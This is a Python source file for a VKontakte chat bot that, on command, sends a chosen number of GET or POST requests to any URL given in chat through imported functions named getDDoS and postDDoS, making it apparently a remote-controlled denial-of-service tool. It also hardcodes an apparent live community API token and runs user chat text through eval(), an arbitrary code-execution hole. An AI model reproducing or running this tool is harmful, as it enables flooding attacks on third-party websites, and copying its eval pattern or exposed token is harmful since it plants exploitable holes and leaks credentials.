from vk_api import VkApi
from vk_api.longpoll import VkLongPoll, VkEventType
from POSTGET import postDDoS, getDDoS

token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a0f6f1ff452c28d91003cfce' # Community token

vk_session = VkApi(token=token) # "Run" your community
vk = vk_session.get_api() # Begin work with API
longpoll = VkLongPoll(vk_session) # Longpoll makes that community recive messagess

# This half of code use bots
# Here is no notifications
# It also do all what do mainDDoS but without notifications

def secondDDoS():
    try:
        for event in longpoll.listen(): # Wait for next command
            if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                if event.text == 'Назад': # If command is "Назад" and break cycle
                    break
                elif event.text == 'Выход': # If command is "Выход" and break cycle
                    break
                elif event.text == 'GET': # If command is "GET" enter in GET menu
                    for event in longpoll.listen():
                        if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                            if event.text == 'Назад': # If command is "Назад" and break cycle
                                break
                            elif event.text == 'Выход': # If command is "Выход" and break cycle
                                break
                            elif event.text != 'Назад': # If command is not "Назад" - remember last string as url
                                url = event.text
                                for event in longpoll.listen(): # Wait for next command - count of repetitions
                                    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                        if event.text == 'Назад': # If command is "Назад" and break cycle
                                            break
                                        elif event.text == 'Выход': # If command is "Выход" and break cycle
                                            break
                                        elif event.text != 'Назад': # If command is not "Назад" - and begin send requests
                                            for i in range(int(event.text)):
                                                getDDoS(url)
                                            # After end of DDoS type "Выход" to return in main menu
                                            break
                elif event.text == 'POST': # if comand is POST - mutually exclusive with GET
                    for event in longpoll.listen():
                        if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                            if event.text == 'Назад': # If command is "Назад" and break cycle
                                break
                            elif event.text == 'Выход': # If command is "Выход" and break cycle
                                break
                            elif event.text != 'Назад': # If command is not "Назад" - reapet url and asks for a data tuple
                                url = event.text
                                for event in longpoll.listen(): # Wait for next command
                                    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                        if event.text == 'Назад': # If command is "Назад" and break cycle
                                            break
                                        elif event.text == 'Выход': # If command is "Выход" and break cycle
                                            break
                                        elif event.text != 'Назад': # If command is not "Назад" - reapet tuple as "data" and asks for count of repetitions
                                            data = event.text
                                            dict = eval(data)
                                            for event in longpoll.listen(): # Wait next message
                                                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                                    if event.text == 'Назад': # If command is "Назад" and break cycle
                                                        break
                                                    elif event.text == 'Выход': # If command is "Выход" and break cycle
                                                        break
                                                    elif event.text != 'Назад': # If command is not "Назад" - and begin send requests
                                                        print(dict)
                                                        for i in range(int(event.text)):
                                                            postDDoS(url, dict)
                                                        # After end of DDoS type "Выход" 2 times to return in main menu
                                                        break
    except:
        pass